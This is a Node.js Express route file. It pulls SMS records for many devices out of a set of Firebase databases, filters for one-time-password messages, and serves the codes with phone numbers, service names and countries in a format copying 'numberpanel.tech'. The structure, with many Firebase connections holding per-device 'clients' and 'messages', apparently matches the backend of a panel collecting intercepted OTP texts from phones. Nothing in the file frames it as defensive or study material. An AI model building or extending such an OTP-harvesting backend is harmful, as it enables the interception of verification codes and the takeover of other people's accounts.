"use strict";

/**
 * OTP API route.
 * Matches numberpanel.tech/api/otp format exactly.
 *
 * Response: Array of [service, phone, raw_sms, timestamp, " country"]
 */

const { Router } = require("express");
const ConnectionsService = require("../services/connections");
const FirebaseService = require("../services/firebase");
const DeviceService = require("../services/devices");
const OtpExtractor = require("../services/otpExtractor");
const { getPhone } = require("../utils/phone");

const router = Router();

let _cache = { data: null, timestamp: 0 };
const CACHE_TTL_MS = 10000;

/**
 * GET /api/otp
 * Returns: [[service, phone, raw_sms, timestamp, country], ...]
 */
router.get("/", async (req, res, next) => {
  try {
    // Default: 50 OTPs. Use count=0 or count=all for everything.
    const countParam = req.query.count;
    let count;
    if (countParam === "0" || countParam === "all") {
      count = 0;
    } else if (countParam) {
      count = Math.min(parseInt(countParam) || 50, 500);
    } else {
      count = 50;
    }
    const fresh = req.query.fresh === "1";

    if (!fresh && _cache.data && (Date.now() - _cache.timestamp) < CACHE_TTL_MS) {
      return res.json(count > 0 ? _cache.data.slice(0, count) : _cache.data);
    }

    const connections = await ConnectionsService.getAllActive();
    if (connections.length === 0) return res.json([]);

    const allOtps = [];

    const results = await Promise.allSettled(
      connections.map(async (conn) => {
        try {
          const [clientsData, messagesRoot] = await Promise.all([
            FirebaseService.read(conn.url, conn.key, "clients").catch(() => null),
            FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
          ]);

          const devices = DeviceService.parseAll(clientsData);
          const connOtps = [];

          if (messagesRoot && typeof messagesRoot === "object") {
            for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
              if (!deviceMessages || typeof deviceMessages !== "object") continue;

              const device = devices.find((d) => d.id === deviceId) || { id: deviceId };

              // Extract phone — try device data, raw client data, then messages
              let phone = getPhone(device, clientsData?.[deviceId], Object.values(deviceMessages));

              for (const [, msg] of Object.entries(deviceMessages)) {
                if (!msg || typeof msg !== "object") continue;

                const text = msg.text || msg.body || msg.message || "";
                if (!OtpExtractor.isOtpMessage(text)) continue;

                const extracted = OtpExtractor.extractOtp(text);
                if (!extracted) continue;

                // Timestamp: try every possible field
                const ts = getTimestamp(msg);

                const country = OtpExtractor.detectCountry(phone);

                // Exact numberpanel.tech format: [service, phone, raw_sms, timestamp, " country"]
                connOtps.push([
                  extracted.service,
                  phone || "Unknown",
                  text.trim(),
                  ts,
                  " " + country,
                ]);
              }
            }
          }

          return connOtps;
        } catch {
          return [];
        }
      })
    );

    for (const result of results) {
      if (result.status === "fulfilled") allOtps.push(...result.value);
    }

    // Sort by timestamp (newest first)
    allOtps.sort((a, b) => {
      const da = new Date(a[3]).getTime() || 0;
      const db = new Date(b[3]).getTime() || 0;
      return db - da;
    });

    _cache = { data: allOtps, timestamp: Date.now() };
    res.json(count > 0 ? allOtps.slice(0, count) : allOtps);
  } catch (err) {
    next(err);
  }
});

/**
 * GET /api/otp/stats
 */
router.get("/stats", async (req, res, next) => {
  try {
    const connections = await ConnectionsService.getAllActive();
    res.json({
      activeConnections: connections.length,
      cachedOtps: _cache.data ? _cache.data.length : 0,
      cacheAgeSeconds: _cache.timestamp ? Math.round((Date.now() - _cache.timestamp) / 1000) : -1,
      cacheTtlSeconds: CACHE_TTL_MS / 1000,
    });
  } catch (err) {
    next(err);
  }
});

// ═══ Helpers ═══════════════════════════════════════════════

/**
 * Extract phone number from all available sources.
 * Normalizes to match numberpanel.tech format (full international, no +).
 */

/**
 * Extract timestamp from a message, trying every possible field.
 * Returns formatted "YYYY-MM-DD HH:MM:SS" string.
 */
function getTimestamp(msg) {
  const raw = msg.timestamp || msg.time || msg.date || msg.receivedAt
    || msg.createdAt || msg.sentAt || msg.ts || "";

  if (!raw) {
    return formatNow();
  }

  // If it's a number (epoch ms or epoch seconds)
  if (typeof raw === "number") {
    const ms = raw > 1e12 ? raw : raw * 1000;
    return formatDate(new Date(ms));
  }

  // Try parsing as date string
  const d = new Date(raw);
  if (!isNaN(d.getTime())) {
    return formatDate(d);
  }

  // Return as-is if it looks like a formatted date
  if (typeof raw === "string" && /\d{4}[-/]\d{2}[-/]\d{2}/.test(raw)) {
    return raw.replace(/\//g, "-").slice(0, 19);
  }

  return formatNow();
}

function formatDate(d) {
  const pad = (n) => String(n).padStart(2, "0");
  return `${d.getUTCFullYear()}-${pad(d.getUTCMonth()+1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
}

function formatNow() {
  return formatDate(new Date());
}

module.exports = router;
